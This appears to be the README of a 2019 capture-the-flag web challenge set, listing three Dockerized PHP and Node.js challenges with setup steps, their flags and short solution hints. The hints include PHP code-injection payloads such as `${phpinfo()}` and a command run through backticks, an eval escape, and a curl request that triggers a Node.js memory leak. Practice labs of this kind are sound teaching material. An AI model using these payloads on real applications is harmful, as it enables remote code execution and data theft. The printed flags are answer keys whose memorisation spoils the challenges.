## MCSC 2019 Web Security Challenges
>thinbashane < @art0flunam00n >

**1.web100 - lolslashes**

Description 
 - get RCE & read the `fl4g` file

Flag
 - `MCSC_2019{php_v4ri4bl3s_v4ri4ble}`

Setting up
 - `cd web100` - change directory to the challenge
 - `docker build .` - build from Dockerfile
 - `docker run -p 1331:80 <built_hash>` - run docker containter
 - `http://<IP_ADDRESS>:1331` - Challenge Access URL

Writeup
 - releases after competition
 - `string1=${phpinfo()}`
 ```
 string1=${`find / -name fl4g`}
```
---
**2.web200a - lolevil**

Description
 - get RCE & read the `fl4g` file

Flag
 - `MCSC_2019{php_3val_0bj3ct_r3ferencing}`

Setting up
 - `cd web200a` - change directory to the challenge
 - `docker build .` - build from Dockerfile
 - `docker run -p 1332:80 <built_hash>` - run docker containter
 - `http://<IP_ADDRESS>:1332` - Challenge Access URL

Writeup
 - releases after competition
 - Reference `r:2` to authorize 
 - and escape eval `'.phpinfo().'`
---

**3.web200b - lolnode**

Description
 - read the `flag` in memory

Flag
 - `MCSC_2019{n0d3_j5_m3m0ry_L3ak}`

Setting up
 - `cd web200b` - change directory to the challenge
 - `docker build .` - build from Dockerfile
 - `docker run -p 3000:3000 <built_hash>` - run docker containter
 - `http://<IP_ADDRESS>:3000` - Challenge Access URL

Writeup

 - release after competition
 - `curl 'http://<ip>:<port>/login -X POST -H "Content-Type: application/json" --data "{\"password\":100}" | hexdump -c`

